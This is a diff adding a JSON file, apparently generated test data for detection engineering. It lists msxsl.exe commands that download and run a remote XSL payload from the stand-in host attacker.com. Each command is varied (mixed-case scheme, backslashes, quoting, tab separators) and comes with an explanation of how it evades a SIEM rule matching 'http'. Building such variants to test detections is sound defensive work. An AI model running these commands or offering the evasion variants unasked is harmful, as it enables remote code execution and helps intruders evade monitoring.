@@ -1,0 +1,22 @@
+[
+  {
+    "output": "msxsl.exe HtTp://attacker.com/payload.xml C:\\Windows\\Diagnostics\\system\\UPS\\util.xsl",
+    "explanation": "Substitution technique. Modifies the casing of the protocol scheme to mixed case ('HtTp://'). This targets the `CommandLine|contains: 'http'` rule condition. If the underlying SIEM platform or database index performs case-sensitive string matching for un-modifier parameters, this variant completely avoids detection while the native Windows URLMON subsystem processes the network scheme case-insensitively."
+  },
+  {
+    "output": "msxsl.exe https:\\\\attacker.com\\payload.xml C:\\Windows\\Diagnostics\\system\\UPS\\util.xsl",
+    "explanation": "Substitution technique. Replaces the standard URL forward slashes (`//`) following the scheme with backslashes (`\\\\`). This alters the literal string sequence to break simple string filtering for `http`, while the underlying Windows URL extraction libraries automatically normalize path slash directions back to valid remote network addresses during fetching."
+  },
+  {
+    "output": "msxsl.exe \"http://attacker.com/payload.xml\" C:\\Windows\\Diagnostics\\system\\UPS\\util.xsl",
+    "explanation": "Insertion technique. Encloses the target URL argument string inside double quotation marks. While this variation still sequence-matches the target substring characters, it shifts the token boundaries, which is designed to evade fragile custom regex patterns or token-distance logic that strictly expects unquoted strings directly following the executable name."
+  },
+  {
+    "output": "msxsl.exe\thttp://attacker.com/payload.xml C:\\Windows\\Diagnostics\\system\\UPS\\util.xsl",
+    "explanation": "Insertion technique. Replaces the standard blank space separating the binary name and the target network address with a horizontal tab (`\t`) character. The Windows process execution scheduler natively evaluates tab characters as valid parameter delimiters, but it can disrupt basic downstream string containment filters that rely explicitly on single space boundaries to isolate file tokens."
+  },
+  {
+    "output": "",
+    "explanation": "Omission technique note: Completely omitting or hiding the base protocol scheme characters (such as passing the scheme structure via environment variables directly on the native shell command line) is not safely supported by msxsl's internal command-line handler without causing a remote resource resolution failure."
+  }
+]
